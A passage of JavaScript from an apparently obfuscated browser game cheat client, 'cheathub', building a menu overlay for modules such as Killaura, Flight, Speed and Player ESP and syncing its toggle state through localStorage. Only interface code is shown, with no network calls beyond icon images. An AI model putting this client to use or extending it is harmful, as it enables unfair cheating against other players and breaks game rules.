style=\"border-top-right-radius: 5px; border-top-left-radius: 5px;\" class=\"headfont headercheathub\" id=\"cheathubmenubutton1\">\r\n  <img class=\"unselectable\" src=\"https://cdn.discordapp.com/attachments/884353997417349160/1144028331898052648/cheathubLogo1.png\"style=\"margin-top: 4px;\" alt=\"\">\r\n  <img class=\"unselectable\" src=\"https://cdn.discordapp.com/attachments/884353997417349160/1144028361077833788/cheathubLogo2.png\"style=\"margin-top: 4px;\" alt=\"\">\r\n\r\n  <!--<button class=\"haxorrrrr\"><img title=\"Resets all gui positions\" class=\"unselectable haxorrrrr\" src=\"https://cdn.discordapp.com/attachments/1144032440394981407/1144213444736856094/BackIcon_-_Copy.png\"style=\"margin-bottom: 1px; margin-left: 73px;\" alt=\"\"></button>-->\r\n\r\n  </button>\r\n  </li>\r\n  <li><div class=\"line\"></div></li>\r\n\r\n\r\n  <li><button class=\"normalfont skidbutton\" id=\"guicombatbutton\">\r\n  <img class=\"unselectable\" src=\"https://cdn.discordapp.com/attachments/1144032440394981407/1144033258024206336/CombatIcon.png\"style=\"margin-top: -6px;\" alt=\"\">\r\n  <div class=\"textlol\">Combat<div>\r\n  </button>\r\n  </li>\r\n\r\n  <li><button class=\"normalfont skidbutton\" id=\"guiblatantbutton\">\r\n  <img class=\"unselectable\" src=\"https://cdn.discordapp.com/attachments/1144032440394981407/1144033257588011048/BlatantIcon.png\"style=\"margin-top: -6px;\" alt=\"\">\r\n  <div class=\"textlol\">Blatant<div>\r\n  </button>\r\n  </li>\r\n\r\n  <li><button class=\"normalfont skidbutton\" id=\"guirenderbutton\">\r\n  <img class=\"unselectable\" src=\"https://media.discordapp.net/attachments/1144032440394981407/1144033256304550030/RenderIcon.png\"style=\"margin-top: -6px;\" alt=\"\">\r\n  <div class=\"textlol\">Render<div>\r\n  </button>\r\n  </li>\r\n\r\n  <li><button class=\"normalfont skidbutton\" id=\"guitoolsbutton\">\r\n  <img class=\"unselectable\" src=\"https://media.discordapp.net/attachments/1144032440394981407/1144033256627503215/UtilityIcon.png\"style=\"margin-top: -6px;\" alt=\"\">\r\n  <div class=\"textlol\">Utility<div>\r\n  </button>\r\n  </li>\r\n\r\n  <li><button class=\"normalfont skidbutton\" id=\"guiworldbutton\">\r\n  <img class=\"unselectable\" src=\"https://cdn.discordapp.com/attachments/1144032440394981407/1144033256900141066/WorldIcon.png\"style=\"margin-top: -6px;\" alt=\"\">\r\n  <div class=\"textlol\">World<div>\r\n  </button>\r\n  </li>\r\n\r\n\r\n  <li><button style=\"color: rgb(125,125,125)\" class=\"normalfont headercheathub2\">MISC<li>\r\n  <li><div class=\"line0\"></div></li>\r\n\r\n  <li><button class=\"normalfont skidbutton\" id=\"guifriendsbutton\">\r\n  <div class=\"normaltextlol\">Friends<div>\r\n  </button>\r\n  </li>\r\n\r\n   <li><button class=\"normalfont skidbutton\" id=\"guiprofilebutton\">\r\n  <div class=\"normaltextlol\">Profiles<div>\r\n  </button>\r\n  </li>\r\n\r\n  <li><button class=\"normalfont bottombutton skidbutton\" id=\"resetguipos\">\r\n  <div class=\"normaltextlol\">Reset GUI<div>\r\n  </button>\r\n  </li>\r\n</ul2>\r\n\r\n\r\n<!-- Profiles -->\r\n<ul3 class=\"clientmodule2\" id=\"cheathubmenu7\">\r\n    <li><button class=\"normalfont skidbutton3 topbutton\" id=\"cheathubmenubutton7\">\r\n  <img class=\"unselectable\" src=\"https://cdn.discordapp.com/attachments/1144032440394981407/1145580819855970344/ProfilesIcon.png\"style=\"margin-bottom: 2px;\" alt=\"\">\r\n  <div class=\"textlol2\">Profiles<div>\r\n\r\n  </button>\r\n  </li>\r\n  <li><div class=\"line0\"></div></li>\r\n  <li class=\"hidethis7\">\r\n    <div class=\"skidinput hidethis7\" style=\"display: flex;\">\r\n      <input style=\"outline: grey; margin-top: 5px; margin-left: 4px;\" class=\"normalfont skidinput3 outlined-input\" type=\"text\" maxlength=\"28\" placeholder=\"Input Profile Name\">\r\n      <button style=\"height: 26px; width: 26px;\" class=\"invisible-button\">\r\n      <img class=\"unselectable skidiconbutton\" id=\"profilesbutton\" src=\"https://cdn.discordapp.com/attachments/1144032440394981407/1148387694829916240/AddItem.png\">\r\n      </button>\r\n    </div>\r\n  </li>\r\n\r\n\r\n</ul3>\r\n\r\n\r\n<!-- Friends -->\r\n<ul3 class=\"clientmodule8\" id=\"cheathubmenu8\">\r\n  <li>\r\n    <button class=\"normalfont skidbutton3 topbutton\" id=\"cheathubmenubutton8\">\r\n      <img class=\"unselectable\" src=\"https://cdn.discordapp.com/attachments/1144032440394981407/1148386108145680384/FriendsIcon.png\" style=\"margin-bottom: 2px;\" alt=\"\">\r\n      <div class=\"textlol2\">Friends</div>\r\n    </button>\r\n  </li>\r\n  <li>\r\n    <div class=\"line0\"></div>\r\n  </li>\r\n  <li class=\"hidethis8\">\r\n    <div class=\"skidinput hidethis8\" style=\"display: flex;\">\r\n      <input style=\"outline: grey; margin-top: 5px; margin-left: 4px;\" class=\"normalfont skidinput3 outlined-input\" type=\"text\" maxlength=\"20\" placeholder=\"Input Friend Name\">\r\n      <button style=\"height: 26px; width: 26px;\" class=\"invisible-button\">\r\n      <img class=\"unselectable skidiconbutton\" id=\"friendsbutton\" src=\"https://cdn.discordapp.com/attachments/1144032440394981407/1148387694829916240/AddItem.png\">\r\n      </button>\r\n    </div>\r\n  </li>\r\n</ul3>\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n<!-- Combat -->\r\n\r\n\r\n<ul3 class=\"clientmodule2\" id=\"cheathubmenu2\">\r\n    <li><button class=\"normalfont skidbutton3 topbutton\" id=\"cheathubmenubutton2\">\r\n  <img class=\"unselectable\" src=\"https://cdn.discordapp.com/attachments/1144032440394981407/1144033258024206336/CombatIcon.png\"style=\"margin-top: -6px;\" alt=\"\">\r\n  <div class=\"textlol2\">Combat<div>\r\n\r\n  </button>\r\n  </li>\r\n  <li><div class=\"line0\"></div></li>\r\n    <li><button id=\"Killaura\"class=\"normalfont skidbutton hidethis2\"><div class=\"normaltextlol\" >Killaura<div>\r\n          <img class=\"unselectable \" style='position: absolute; right: 7px; top: 46px; scale: 0.7; filter: brightness(0.4)' src=\"\">\r\n\r\n    </button></li>\r\n\r\n\r\n  </li>\r\n\r\n\r\n</ul3>\r\n\r\n<!-- Blatant -->\r\n\r\n<ul3 class=\"clientmodule2\" id=\"cheathubmenu3\">\r\n    <li><button class=\"normalfont skidbutton3 topbutton\" id=\"cheathubmenubutton3\">\r\n  <img class=\"unselectable\" src=\"https://cdn.discordapp.com/attachments/1144032440394981407/1144033257588011048/BlatantIcon.png\"style=\"margin-top: -6px;\" alt=\"\">\r\n  <div class=\"textlol2\">Blatant<div>\r\n  </button>\r\n  </li>\r\n  <li><div class=\"line0\"></div></li>\r\n\r\n  <li><button id=\"Speeder\"class=\"normalfont skidbutton hidethis3\" ><div class=\"normaltextlol\" >Speed<div></button></li>\r\n  <li><button id=\"Flighter\"class=\"normalfont skidbutton hidethis3\" ><div class=\"normaltextlol\" >Flight<div></button></li>\r\n  <li><button id=\"Highjumper\"class=\"normalfont skidbutton hidethis3\" ><div class=\"normaltextlol\" >Highjump<div></button></li>\r\n\r\n\r\n</ul3>\r\n\r\n<!-- Render -->\r\n\r\n<ul3 class=\"clientmodule2\" id=\"cheathubmenu4\">\r\n    <li><button class=\"normalfont skidbutton3 topbutton\" id=\"cheathubmenubutton4\">\r\n  <img class=\"unselectable\" src=\"https://cdn.discordapp.com/attachments/1144032440394981407/1144033258024206336/CombatIcon.png\"style=\"margin-top: -6px;\" alt=\"\">\r\n  <div class=\"textlol2\">Render<div>\r\n\r\n  </button>\r\n  </li>\r\n  <li><div class=\"line0\"></div></li>\r\n  <li>\r\n  <button id=\"espplayer\" class=\"normalfont skidbutton hidethis4\" style=\"position: relative;\">\r\n    <div class=\"normaltextlol\">Player ESP</div>\r\n      <div>\r\n        <img class=\"unselectable\" style=\"position: absolute; right: 5px; top: 18%; scale: 0.7; filter: brightness(0.4);\" src=\"\">\r\n      </div>\r\n    </button>\r\n  </li>\r\n        <li hidden><button id=\"\"class=\"normalfont skidbutton hidethis4 semihide\"><div class=\"normaltextlol\">Player Esp Box Color<div>\r\n        <input \"class=\"normalfont skidslider hidethis4 semihide\" type=\"color\" id=\"playerespcolor\">\r\n        </button></li>\r\n\r\n\r\n\r\n    <li>\r\n  <button id=\"espthrow\" class=\"normalfont skidbutton hidethis4\" style=\"position: relative;\">\r\n    <div class=\"normaltextlol\">Projectile ESP</div>\r\n      <div>\r\n        <img class=\"unselectable\" style=\"position: absolute; right: 5px; top: 18%; scale: 0.7; filter: brightness(0.4);\" src=\"\">\r\n      </div>\r\n    </button>\r\n  </li>\r\n        <li hidden><button id=\"\"class=\"normalfont skidbutton hidethis4 semihide\"><div class=\"normaltextlol\">Projectile Esp Box Color<div>\r\n        <input \"class=\"normalfont skidslider hidethis4 semihide\" type=\"color\" id=\"throwespcolor\">\r\n        </button></li>\r\n\r\n\r\n\r\n    <li>\r\n  <button id=\"tracersplayer\" class=\"normalfont skidbutton hidethis4\" style=\"position: relative;\">\r\n    <div class=\"normaltextlol\">Player ESP</div>\r\n      <div>\r\n        <img class=\"unselectable\" style=\"position: absolute; right: 5px; top: 18%; scale: 0.7; filter: brightness(0.4);\" src=\"\">\r\n      </div>\r\n    </button>\r\n  </li>\r\n\r\n    <li>\r\n  <button id=\"tracersthrow\" class=\"normalfont skidbutton hidethis4\" style=\"position: relative;\">\r\n    <div class=\"normaltextlol\">Projectile Tracers</div>\r\n      <div>\r\n        <img class=\"unselectable\" style=\"position: absolute; right: 5px; top: 18%; scale: 0.7; filter: brightness(0.4);\" src=\"\">\r\n      </div>\r\n    </button>\r\n  </li>\r\n\r\n\r\n</ul3>\r\n\r\n<!-- Utility -->\r\n\r\n<ul3 class=\"clientmodule2\" id=\"cheathubmenu5\">\r\n    <li><button class=\"normalfont skidbutton3 topbutton\" id=\"cheathubmenubutton5\">\r\n  <img class=\"unselectable\" src=\"https://media.discordapp.net/attachments/1144032440394981407/1144033256627503215/UtilityIcon.png\"style=\"margin-top: -6px;\" alt=\"\">\r\n  <div class=\"textlol2\">Utility<div>\r\n  </button>\r\n  </li>\r\n  <li><div class=\"line0\"></div></li>\r\n  <li><button id=\"Nocobwebs\"class=\"normalfont skidbutton hidethis5\" ><div class=\"normaltextlol\" >Anticobweb<div></button></li>\r\n  <li><button id=\"Autotoxic\"class=\"normalfont skidbutton hidethis5\" ><div class=\"normaltextlol\" >Autotoxic<div></button></li>\r\n  <li><button id=\"Funnypacket\"class=\"normalfont skidbutton hidethis5\" ><div class=\"normaltextlol\" >Funnypacket<div></button></li>\r\n  <li><button id=\"Skinchanger\"class=\"normalfont skidbutton hidethis5\" ><div class=\"normaltextlol\" >Skinchanger<div></button></li>\r\n\r\n</ul3>\r\n\r\n\r\n<!-- world-->\r\n\r\n<ul3 class=\"clientmodule2\" id=\"cheathubmenu6\">\r\n    <li><button class=\"normalfont skidbutton3 topbutton\" id=\"cheathubmenubutton6\">\r\n  <img class=\"unselectable\" src=\"https://cdn.discordapp.com/attachments/1144032440394981407/1144033256900141066/WorldIcon.png\"style=\"margin-top: -6px;\" alt=\"\">\r\n  <div class=\"textlol2\">World<div>\r\n\r\n\r\n  </button>\r\n  </li>\r\n  <li><div class=\"line0\"></div></li>\r\n\r\n</ul3>\r\n\r\n</body>";
        let khatia = document.createElement("div");
        khatia.className = "hackoverlay";
        khatia.innerHTML = khary;
        khatia.style.cssText = "position:absolute; z-index:19999;";
        document.body.appendChild(khatia);
        function sabiha(shann) {
          document.querySelector("#cheathubmenu" + shann + " > li:nth-child(2) > div").hidden = true;
          document.querySelector("#cheathubmenubutton" + shann + "").style.borderBottomLeftRadius = "5px";
          document.querySelector("#cheathubmenubutton" + shann + "").style.borderBottomRightRadius = "5px";
        }
        function zyanya(itianna) {
          document.querySelector("#cheathubmenu" + itianna + " > li:nth-child(2) > div").hidden = false;
          document.querySelector("#cheathubmenubutton" + itianna + "").style.borderBottomLeftRadius = "0px";
          document.querySelector("#cheathubmenubutton" + itianna + "").style.borderBottomRightRadius = "0px";
        }
        function jannika(udella, elonie) {
          document.querySelector("#cheathubmenu" + udella + " > li:nth-child(2) > div").hidden = false;
          document.querySelector("#cheathubmenubutton" + udella + "").style.borderBottomLeftRadius = "0px";
          document.querySelector("#cheathubmenubutton" + udella + "").style.borderBottomRightRadius = "0px";
          document.querySelector("#cheathubmenu" + udella + "").style.height = elonie + "px";
          var cannyn = document.querySelectorAll(".hidethis" + udella + "");
          cannyn.forEach(nymeria => nymeria.hidden = false);
        }
        function samena(naryan) {
          document.querySelector("#cheathubmenu" + naryan + " > li:nth-child(2) > div").hidden = true;
          document.querySelector("#cheathubmenubutton" + naryan + "").style.borderBottomLeftRadius = "5px";
          document.querySelector("#cheathubmenubutton" + naryan + "").style.borderBottomRightRadius = "5px";
          document.querySelector("#cheathubmenu" + naryan + "").style.height = "39px";
          var allionna = document.querySelectorAll(".hidethis" + naryan + "");
          allionna.forEach(tujuan => tujuan.hidden = true);
        }
        cheathub.gui.tick = setInterval(function () {
          localStorage.setItem("cheathub.gui.openedcombat", JSON.stringify(cheathub.gui.openedcombat));
          localStorage.setItem("cheathub.gui.openedblatant", JSON.stringify(cheathub.gui.openedblatant));
          localStorage.setItem("cheathub.gui.openedrender", JSON.stringify(cheathub.gui.openedrender));
          localStorage.setItem("cheathub.gui.openedworld", JSON.stringify(cheathub.gui.openedworld));
          localStorage.setItem("cheathub.gui.openedtools", JSON.stringify(cheathub.gui.openedtools));
          localStorage.setItem("cheathub.gui.openedprofiles", JSON.stringify(cheathub.gui.openedprofiles));
          localStorage.setItem("cheathub.gui.openedfriends", JSON.stringify(cheathub.gui.openedfriends));
          cheathub.gui.openedcombat = JSON.parse(localStorage.getItem("cheathub.gui.openedcombat"));
          cheathub.gui.openedblatant = JSON.parse(localStorage.getItem("cheathub.gui.openedblatant"));
          cheathub.gui.openedrender = JSON.parse(localStorage.getItem("cheathub.gui.openedrender"));
          cheathub.gui.openedworld = JSON.parse(localStorage.getItem("cheathub.gui.openedworld"));
          cheathub.gui.openedtools = JSON.parse(localStorage.getItem("cheathub.gui.openedtools"));
          cheathub.gui.openedprofiles = JSON.parse(localStorage.getItem("cheathub.gui.openedprofiles"));
          cheathub.gui.openedfriends = JSON.parse(localStorage.getItem("cheathub.gui.openedfriends"));
          if (cheathub.killaura == true && document.querySelector("#Killaura")) {
            document.querySelector("#Killaura").style.backgroundColor = cheathub.gui.guicolor;
            document.querySelector("#Killaura").style.color = "white";
            document.querySelector("#Killaura > div > div > img").style.filter = "brightness(1)";
          } else if (document.querySelector("#Killaura").style.backgroundColor == cheathub.gui.guicolor) {
            document.querySelector("#Killaura").style.backgroundColor = "rgb(26,26,26)";
            document.querySelector("#Killaura").style.color = "rgb(125,125,125)";
            document.querySelector("#Killaura > div > div > img").style.filter = "brightness(0.4)";
          }
          ;
          if (cheathub.rendering.esp.playeresp.espenabled == true && document.querySelector("#espplayer")) {
            document.querySelector("#espplayer").style.backgroundColor = cheathub.gui.guicolor;
            document.querySelector("#espplayer").style.color = "white";
            document.querySelector("#espplayer > div:nth-child(2) > img").style.filter = "brightness(1)";
          } else if (document.querySelector("#espplayer").style.backgroundColor == cheathub.gui.guicolor) {
            document.querySelector("#espplayer").style.backgroundColor = "rgb(26,26,26)";
            document.querySelector("#espplayer").style.color = "rgb(125,125,125)";
            document.querySelector("#espplayer > div:nth-child(2) > img").style.filter = "brightness(0.4)";
          }
          ;
          if (cheathub.rendering.esp.throwesp.espenabled == true && document.querySelector("#espthrow")) {
            document.querySelector("#espthrow").style.backgroundColor = cheathub.gui.guicolor;
            document.querySelector("#espthrow").style.color = "white";
            document.querySelector("#espthrow > div:nth-child(2) > img").style.filter = "brightness(1)";
          } else if (document.querySelector("#espthrow").style.backgroundColor == cheathub.gui.guicolor) {
            document.querySelector("#espthrow").style.backgroundColor = "rgb(26,26,26)";
            document.querySelector("#espthrow").style.color = "rgb(125,125,125)";
            document.querySelector("#espthrow > div:nth-child(2) > img").style.filter = "brightness(0.4)";
          }
          ;
          if (cheathub.rendering.esp.playeresp.tracersenabled == true && document.querySelector("#tracersplayer")) {
            document.querySelector("#tracersplayer").style.backgroundColor = cheathub.gui.guicolor;
            document.querySelector("#tracersplayer").style.color = "white";
            document.querySelector("#tracersplayer > div:nth-child(2) > img").style.filter = "brightness(1)";
          } else if (document.querySelector("#tracersplayer").style.backgroundColor == cheathub.gui.guicolor) {
            document.querySelector("#tracersplayer").style.backgroundColor = "rgb(26,26,26)";
            document.querySelector("#tracersplayer").style.color = "rgb(125,125,125)";
            document.querySelector("#tracersplayer > div:nth-child(2) > img").style.filter = "brightness(0.4)";
          }
          ;
          if (cheathub.rendering.esp.throwesp.tracersenabled == true && document.querySelector("#tracersthrow")) {
            document.querySelector("#tracersthrow").style.backgroundColor = cheathub.gui.guicolor;
            document.querySelector("#tracersthrow").style.color = "white";
            document.querySelector("#tracersthrow > div:nth-child(2) > img").style.filter = "brightness(1)";
          } else if (document.querySelector("#tracersthrow").style.backgroundColor == cheathub.gui.guicolor) {
            document.querySelector("#tracersthrow").style.backgroundColor = "rgb(26,26,26)";
            document.querySelector("#tracersthrow").style.color = "rgb(125,125,125)";
            document.querySelector("#tracersthrow > div:nth-child(2) > img").style.filter = "brightness(0.4)";
          }
          ;
          if (cheathub.funnypacket == true && document.querySelector("#Funnypacket")) {
            document.querySelector("#Funnypacket").style.backgroundColor = cheathub.gui.guicolor;
            document.querySelector("#Funnypacket").style.color = "white";
          } else if (document.querySelector("#Funnypacket").style.backgroundColor == cheathub.gui.guicolor) {
            document.querySelector("#Funnypacket").style.backgroundColor = "rgb(26,26,26)";
            document.querySelector("#Funnypacket").style.color = "rgb(125,125,125)";
          }
          ;
          if (cheathub.flight == true && document.querySelector("#Flighter")) {
            document.querySelector("#Flighter").style.backgroundColor = cheathub.gui.guicolor;
            document.querySelector("#Flighter").style.color = "white";
          } else if (document.querySelector("#Flighter").style.backgroundColor == cheathub.gui.guicolor) {
            document.querySelector("#Flighter").style.backgroundColor = "rgb(26,26,26)";
            document.querySelector("#Flighter").style.color = "rgb(125,125,125)";
          }
          ;
          if (cheathub.speed == true && document.querySelector("#Speeder")) {
            document.querySelector("#Speeder").style.backgroundColor = cheathub.gui.guicolor;
            document.querySelector("#Speeder").style.color = "white";
          } else if (document.querySelector("#Speeder").style.backgroundColor == cheathub.gui.guicolor) {
            document.querySelector("#Speeder").style.backgroundColor = "rgb(26,26,26)";
            document.querySelector("#Speeder").style.color = "rgb(125,125,125)";
          }
          ;
          if (cheathub.highjump == true && document.querySelector("#Highjumper")) {
            document.querySelector("#Highjumper").style.backgroundColor = cheathub.gui.guicolor;
            document.querySelector("#Highjumper").style.color = "white";
          } else if (document.querySelector("#Highjumper").style.backgroundColor == cheathub.gui.guicolor) {
            document.querySelector("#Highjumper").style.backgroundColor = "rgb(26,26,26)";
            document.querySelector("#Highjumper").style.color = "rgb(125,125,125)";
          }
          ;
          if (cheathub.nocobwebs == true && document.querySelector("#Nocobwebs")) {
            document.querySelector("#Nocobwebs").style.backgroundColor = cheathub.gui.guicolor;
            document.querySelector("#Nocobwebs").style.color = "white";
          } else if (document.querySelector("#Nocobwebs").style.backgroundColor == cheathub.gui.guicolor) {
            document.querySelector("#Nocobwebs").style.backgroundColor = "rgb(26,26,26)";
            document.querySelector("#Nocobwebs").style.color = "rgb(125,125,125)";
          }
          ;
          if (cheathub.autotoxic == true && document.querySelector("#Autotoxic")) {
            document.querySelector("#Autotoxic").style.backgroundColor = cheathub.gui.guicolor;
            document.querySelector("#Autotoxic").style.color = "white";
          } else if (document.querySelector("#Autotoxic").style.backgroundColor == cheathub.gui.guicolor) {
            document.querySelector("#Autotoxic").style.backgroundColor = "rgb(26,26,26)";
            document.querySelector("#Autotoxic").style.color = "rgb(125,125,125)";
          }
          ;
          if (cheathub.skinderp == true && document.querySelector("#Skinchanger")) {
            document.querySelector("#Skinchanger").style.backgroundColor = cheathub.gui.guicolor;
            document.querySelector("#Skinchanger").style.color = "white";
          } else if (document.querySelector("#Skinchanger").style.backgroundColor == cheathub.gui.guicolor) {
            document.querySelector("#Skinchanger").style.backgroundColor = "rgb(26,26,26)";
            document.querySelector("#Skinchanger").style.color = "rgb(125,125,125)";
          }
          ;
          if (cheathub.gui.combat == true && document.querySelector("#cheathubmenu2")) {
            document.querySelector("#cheathubmenu2").hidden = false;
            document.querySelector("#guicombatbutton").style.backgroundColor = cheathub.gui.guicolor;
            document.querySelector("#guicombatbutton").style.color = "white";
          } else {
            document.querySelector("#cheathubmenu2").hidden = true;
            if (document.querySelector("#guicombatbutton").style.backgroundColor == cheathub.gui.guicolor) {
              document.querySelector("#guicombatbutton").style.backgroundColor = "rgb(26,26,26)";
              document.querySelector("#guicombatbutton").style.color = "rgb(125,125,125)";
            }
          }
          ;
          if (cheathub.gui.blatant == true && document.querySelector("#cheathubmenu3")) {
            document.querySelector("#cheathubmenu3").hidden = false;
            document.querySelector("#guiblatantbutton").style.backgroundColor = cheathub.gui.guicolor;
            document.querySelector("#guiblatantbutton").style.color = "white";
          } else {
            document.querySelector("#cheathubmenu3").hidden = true;
            if (document.querySelector("#guiblatantbutton").style.backgroundColor == cheathub.gui.guicolor) {
              document.querySelector("#guiblatantbutton").style.backgroundColor = "rgb(26,26,26)";
              document.querySelector("#guiblatantbutton").style.color = "rgb(125,125,125)";
            }
          }
          ;
          if (cheathub.gui.render == true && document.querySelector("#cheathubmenu4")) {
            document.querySelector("#cheathubmenu4").hidden = false;
            document.querySelector("#guirenderbutton").style.backgroundColor = cheathub.gui.guicolor;
            document.querySelector("#guirenderbutton").style.color = "white";
          } else {
            document.querySelector("#cheathubmenu4").hidden = true;
            if (document.querySelector("#guirenderbutton").style.backgroundColor == cheathub.gui.guicolor) {
              document.querySelector("#guirenderbutton").style.backgroundColor = "rgb(26,26,26)";
              document.querySelector("#guirenderbutton").style.color = "rgb(125,125,125)";
            }
          }
          ;
          if (cheathub.gui.tools == true && document.querySelector("#cheathubmenu5")) {
            document.querySelector("#cheathubmenu5").hidden = false;
            document.querySelector("#guitoolsbutton").style.backgroundColor = cheathub.gui.guicolor;
            document.querySelector("#guitoolsbutton").style.color = "white";
          } else {
            document.querySelector("#cheathubmenu5").hidden = true;
            if (document.querySelector("#guitoolsbutton").style.backgroundColor == cheathub.gui.guicolor) {
              document.querySelector("#guitoolsbutton").style.backgroundColor = "rgb(26,26,26)";
              document.querySelector("#guitoolsbutton").style.color = "rgb(125,125,125)";
            }
          }
          ;
          if (cheathub.gui.world == true && document.querySelector("#cheathubmenu6")) {
            document.querySelector("#cheathubmenu6").hidden = false;
            document.querySelector("#guiworldbutton").style.backgroundColor = cheathub.gui.guicolor;
            document.querySelector("#guiworldbutton").style.color = "white";
          } else {
            document.querySelector("#cheathubmenu6").hidden = true;
            if (document.querySelector("#guiworldbutton").style.backgroundColor == cheathub.gui.guicolor) {
              document.querySelector("#guiworldbutton").style.backgroundColor = "rgb(26,26,26)";
              document.querySelector("#guiworldbutton").style.color = "rgb(125,125,125)";
            }
          }
          ;
          if (cheathub.gui.profiles == true && document.querySelector("#cheathubmenu7")) {
            document.querySelector("#cheathubmenu7").hidden = false;
            document.querySelector("#guiprofilebutton").style.backgroundColor = cheathub.gui.guicolor;
            document.querySelector("#guiprofilebutton").style.color = "white";
          } else {
            document.querySelector("#cheathubmenu7").hidden = true;
            if (document.querySelector("#guiprofilebutton").style.backgroundColor == cheathub.gui.guicolor) {
              document.querySelector("#guiprofilebutton").style.backgroundColor = "rgb(26,26,26)";
              document.querySelector("#guiprofilebutton").style.color = "rgb(125,125,125)";
            }
          }
          ;
          if (cheathub.gui.friends == true && document.querySelector("#cheathubmenu8")) {
            document.querySelector("#cheathubmenu8").hidden = false;
            document.querySelector("#guifriendsbutton").style.backgroundColor = cheathub.gui.guicolor;
            document.querySelector("#guifriendsbutton").style.color = "white";
          } else {
            document.querySelector("#cheathubmenu8").hidden = true;
            if (document.querySelector("#guifriendsbutton").style.backgroundColor == cheathub.gui.guicolor) {
              document.querySelector("#guifriendsbutton").style.backgroundColor = "rgb(26,26,26)";
              document.querySelector("#guifriendsbutton").style.color = "rgb(125,125,125)";
            }
          }
          ;
          function asriel(luc) {
            let tahni = 0;
            for (let schavon = 0; schavon < luc.childElementCount; schavon++) {
              if (luc.children[schavon].hidden && luc.children[schavon].lastChild.classList.contains("semihide")) {} else {
                tahni += 1;
              }
            }
            ;
            return tahni - 1;
          }
          asriel(document.querySelector("#cheathubmenu2"));
          if (parseFloat(getComputedStyle(document.querySelector("#cheathubmenu2")).height) <= 40) {
            if (document.querySelector("#cheathubmenu2 > li:nth-child(2) > div").hidden != true) {
              samena(2);
              cheathub.gui.openedblatant = false;
            }
          } else {
            jannika(2, (Array.from(document.querySelector("#cheathubmenu2").children).filter(ellamaria => !ellamaria.querySelector("div").hidden && ellamaria.classList.contains("semihide")).length - 1) * 40);
            let moreno = "hidethis2";
            let tristun = document.getElementsByClassName(moreno)[document.querySelectorAll("." + moreno + "").length - 1];
            if (!tristun.className.includes("bottombutton") && !tristun.parentElement.hidden) {
              tristun.className = tristun.className + " bottombutton";
              if (document.querySelectorAll("." + moreno + "").length - 1 != 0) {
                let shametra = document.getElementsByClassName(moreno)[document.querySelectorAll("." + moreno + "").length - 2];
                console.log("previousElement:", shametra);
                if (shametra) {
                  shametra.className = shametra.className.replaceAll("bottombutton", "");
                }
              }
            } else if (tristun.className.includes("bottombutton")) {
              tristun.className.replaceAll("bottombutton", "");
            }
            ;
            cheathub.gui.openedblatant = true;
          }
          ;
          if (parseFloat(getComputedStyle(document.querySelector("#cheathubmenu3")).height) <= 40) {
            if (document.querySelector("#cheathubmenu3 > li:nth-child(2) > div").hidden != true) {
              samena(3);
              cheathub.gui.openedblatant = false;
            }
          } else {
            jannika(3, (Array.from(document.querySelector("#cheathubmenu2").children).filter(gabriellah => !gabriellah.querySelector("div").hidden && gabriellah.classList.contains("semihide")).length - 1) * 40);
            const aljohara = document.getElementsByClassName("hidethis3");
            let thanvik = document.getElementsByClassName("hidethis3")[document.querySelectorAll(".hidethis3").length - 1];
            if (!thanvik.className.includes("bottombutton")) {
              thanvik.className = thanvik.className + " bottombutton";
            }
            ;
            cheathub.gui.openedblatant = true;
          }
          ;
          if (parseFloat(getComputedStyle(document.querySelector("#cheathubmenu4")).height) <= 40) {
            if (document.querySelector("#cheathubmenu4 > li:nth-child(2) > div").hidden != true) {
              samena(4);
              cheathub.gui.openedrender = false;
            }
          } else {
            jannika(4, (Array.from(document.querySelector("#cheathubmenu2").children).filter(tiffy => !tiffy.querySelector("div").hidden && tiffy.classList.contains("semihide")).length - 1) * 40);
            let roselynne = document.getElementsByClassName("hidethis4")[document.querySelectorAll(".hidethis4").length - 1];
            if (!roselynne.className.includes("bottombutton")) {
              roselynne.className = roselynne.className + " bottombutton";
            }
            ;
            cheathub.gui.openedrender = true;
          }
          ;
          if (parseFloat(getComputedStyle(document.querySelector("#cheathubmenu5")).height) <= 40) {
            if (document.querySelector("#cheathubmenu5 > li:nth-child(2) > div").hidden != true) {
              samena(5);
              cheathub.gui.openedtools = false;
            }
          } else {
            jannika(5, (document.querySelector("#cheathubmenu5").childElementCount - 1) * 40);
            let anquetta = document.getElementsByClassName("hidethis5")[document.querySelectorAll(".hidethis5").length - 1];
            if (!anquetta.className.includes("bottombutton")) {
              anquetta.className = anquetta.className + " bottombutton";
            }
            ;
            cheathub.gui.openedtools = true;
          }
          ;
          if (parseFloat(getComputedStyle(document.querySelector("#cheathubmenu6")).height) <= 40) {
            if (document.querySelector("#cheathubmenu6 > li:nth-child(2) > div").hidden != true) {
              samena(6);
              cheathub.gui.openedworld = false;
            }
          } else {
            jannika(6, (document.querySelector("#cheathubmenu6").childElementCount - 1) * 40);
            let linzee = document.getElementsByClassName("hidethis6")[document.querySelectorAll(".hidethis6").length - 1];
            if (!linzee.className.includes("bottombutton")) {
              linzee.className = linzee.className + " bottombutton";
            }
            ;
            cheathub.gui.openedworld = true;
          }
          ;
          if (parseFloat(getComputedStyle(document.querySelector("#cheathubmenu7")).height) <= 40) {
            if (document.querySelector("#cheathubmenu7 > li:nth-child(2) > div").hidden != true) {
              samena(7);
              cheathub.gui.openedprofiles = false;
            }
          } else {
            jannika(7, (document.querySelector("#cheathubmenu7").childElementCount - 1) * 40);
            let priscylla = document.getElementsByClassName("hidethis7")[document.querySelectorAll(".hidethis7").length - 1];
            if (!priscylla.className.includes("bottombutton")) {
              priscylla.className = priscylla.className + " bottombutton";
            }
            ;
            cheathub.gui.openedprofiles = true;
          }
          ;
          if (parseFloat(getComputedStyle(document.querySelector("#cheathubmenu8")).height) <= 40) {
            if (document.querySelector("#cheathubmenu8 > li:nth-child(2) > div").hidden != true) {
              samena(8);
              cheathub.gui.openedfriends = false;
            }
          } else {
            jannika(8, (document.querySelector("#cheathubmenu8").childElementCount - 1) * 40);
            let gervis = document.getElementsByClassName("hidethis8")[document.querySelectorAll(".hidethis8").length - 1];
            if (!gervis.className.includes("bottombutton")) {
              gervis.className = gervis.className + " bottombutton";
            }
            ;
            cheathub.gui.openedfriends = true;
          }
        }, 1);
        document.getElementById("resetguipos").addEventListener("click", function () {
          let rhiann = prompt("Do you want to reset the position and settings of all gui? y/n");
          if (rhiann == "y") {
            localStorage.removeItem("cheathubmenu1_x");
            localStorage.removeItem("cheathubmenu1_y");
            localStorage.removeItem("cheathubmenu2_x");
            localStorage.removeItem("cheathubmenu2_y");
            localStorage.removeItem("cheathubmenu3_x");
            localStorage.removeItem("cheathubmenu3_y");
